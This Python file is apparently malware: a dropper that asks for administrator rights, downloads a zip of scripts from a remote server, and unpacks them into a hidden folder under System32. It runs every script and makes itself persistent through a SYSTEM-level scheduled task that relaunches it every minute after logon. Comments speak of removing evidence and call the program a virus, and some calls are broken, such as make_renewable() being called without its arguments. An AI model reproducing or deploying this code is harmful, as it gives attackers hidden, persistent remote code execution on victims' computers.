# the script that makes everything work
import os # To interact with operating system
import sys # To interact with operating system
import ctypes # to get admin privileges
import requests # To download scripts
import subprocess # to launch scripts with admin privileges
import shutil # to copy script
from zipfile import ZipFile # to deal with zip files

ZIP_URL = 'http://127.0.0.1:8000/scripts' # the url from which the zip containing the scripts will be downloaded
ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
TaskName = 'WindowsGeneralManager'

scripts_paths = [] # the paths of the scripts


def check_admin(win=False):
    if win: # for windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() # check if admin
        except:
            return False # an exception will be raised if not admin
    else: # for linux & MacOS (darwin)
        return os.getuid() == 0 # check for admin

def get_admin(win=False):
    if win:
        is_python_script = os.path.basename(sys.executable).startswith('python')
        if is_python_script: # check if the launching environment is a python script or a standalone exe since sys.argv needs to be different for each one (sys.argv[0] is 'python' so that causes problems for .exe files which are not started that way)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # restart the script, prompting for admin privileges
        else: # for .exe files
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1) # restart the script, prompting for admin privileges
    sys.exit() # stop the script that doesn't have admin

def get_scripts(): # downloads the scripts and puts them all in one place
    r = requests.get(ZIP_URL, headers={'os':sys.platform}) # download the script zips and send the server your OS so it knows which scripts to send
    with open(ZIP_NAME, 'wb') as zip: # create the zip file
        zip.write(r.content) # put the binary content from the request into the zip file
    with ZipFile(ZIP_NAME, 'r') as zip: # open the zip file in ZipFile mode so
        scripts = zip.namelist() # get the list of files in the zip
        for script in scripts:
            with open(f"{scripts_direc}\\{script}", 'wb') as s: # make the file for each script
                s.write(zip.read(script)) # put the contents of the script in the zip into the file being made outside of the zip in the chosen folder
                if not '.ovpn' in script: # make sure that no .ovpn file is logged as a script
                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the list of script paths
                s.close() # close the script file from memory
        zip.close() # close the zip file from memory
    os.remove(ZIP_NAME) # delete the zip file to remove evidence

def start_scripts():
        for script in scripts_paths:
            try:
                if '.py' in script: # for python scripts
                    subprocess.run([sys.executable, script]) # start each python script
                else: # for any files
                    subprocess.run(script, shell=True) # start each script
            except: # if one of the scripts fail to run for any reason
                pass

def make_renewable(py, platform): # makes the script start with admin privileges every time the computer is restarted
    if platform == 'win':
        Command = 'python' if py else __file__  # execute the file, with python if needed
        Arguments = __file__ if py else ''
        WorkingDirectory = __file__.replace(fr'\{os.path.basename(__file__)}', "")  # make the current directory the working directory
        # the task file config
        XML_STARTUP = \
fr'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>false</Enabled>
      <Delay>PT5S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{Command}</Command>
      <Arguments>{Arguments}</Arguments>
      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>'''
        XML_Logon = \
fr'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5S</Delay>
      <Repetition>
        <Interval>PT1M</Interval>
        <Duration>PT24H</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{Command}</Command>
      <Arguments>{Arguments}</Arguments>
      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>'''
        with open(f"{TaskName}.xml", "w") as f:  # make the config file
            f.write(XML_Logon)
        # The command to register the task that will automatically rerun this script on every logon
        cmd = ['schtasks',  # Call task scheduler
               '/Create',  # Tell it you're trying to make a task
               '/TN', TaskName,  # Specify the name of the task
               '/XML', f'{TaskName}.xml',  # Tell it to import the task xml
               '/RU', 'SYSTEM',  # Specify that the user making the task is SYSTEM for highest privileges
               '/F']  # force override if already exists to avoid any errors
        subprocess.run(cmd)  # register the task
        os.remove(f'{TaskName}.xml')  # delete the file to remove evidence
    elif platform == 'linux':
        pass
    else: # MacOS (darwin)
        pass

def make_path_list():
    with open(scripts_direc+'list','w') as f:
        for script in scripts_paths:
            f.write(f"{script}\n")
        f.close()

def load_paths():
    with open(scripts_direc+'list','r') as f:
        paths = f.readlines()
        f.close()
        return paths


if 'win' in sys.platform: # check if win in sys.platform and not win == sys.platform because sys.platform might be win32 or win64 which work the same for this script
    scripts_direc = (r'C:\Windows\System32\WXR')  # the directory where the script will hide new files
    started_file = r'C:\Windows\log-olr'  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    if not check_admin(True):
        get_admin(True)
elif 'linux' == sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
    started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    if not check_admin(True):
        get_admin(True)
elif 'darwin' == sys.platform:
    scripts_direc = ('')  # the directory where the script will hide new files
    started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    if not check_admin(True):
        get_admin(True)
else:
    # -- delete all evidence of the virus --
    sys.exit() # stop the script

if os.path.exists(started_file): # check if the starter has run before and if you just need to start the scripts or download them as well
    scripts_paths = load_paths()
    start_scripts()
else:
    os.makedirs(scripts_direc, exist_ok=True)  # make the directory for the scripts that will be downloaded
    get_scripts()
    make_path_list()
    make_renewable()
    with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
        f.close()
    start_scripts()
